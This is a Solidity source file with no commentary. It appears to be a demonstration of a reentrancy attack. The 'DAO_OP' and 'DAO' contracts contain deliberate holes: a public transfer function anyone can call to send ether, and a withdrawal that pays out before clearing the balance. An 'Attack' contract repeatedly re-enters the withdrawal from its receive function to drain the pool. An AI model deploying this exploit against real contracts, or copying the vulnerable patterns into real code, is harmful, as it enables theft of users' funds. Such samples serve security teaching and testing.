contract DAO_OP {
    mapping (address=>uint256) public userBalance;
    function deposit() public payable {
            userBalance[msg.sender] += msg.value;}
    function transfer(uint256 amount,address ad) public{
        if(amount > 0){
            (bool success, ) = payable(ad).call{value: amount}("");
            }
    }
     function decrease() public {
        userBalance[msg.sender] = 0;}
}
contract DAO {
    DAO_OP private dao_op;
    constructor(address ad) payable {
        dao_op = DAO_OP(ad);
    }
    function withDraw() public {
      uint256 amount = dao_op.userBalance(msg.sender);
      if(amount > 0){
            dao_op.transfer(amount, msg.sender);
            dao_op.decrease();
        }
    }
}
contract Attack {
    DAO_OP dao_op;
    DAO dao;
    constructor(address ad,address ad2) payable {
        dao_op = DAO_OP(ad);
        dao = DAO(ad2);
    }
    function attack() public payable {
        dao_op.deposit{value: 1 ether}();
        dao.withDraw();
    }
    receive() external payable {
        if(address(dao_op).balance >=1 ether){
                dao.withDraw();
        }
    }
}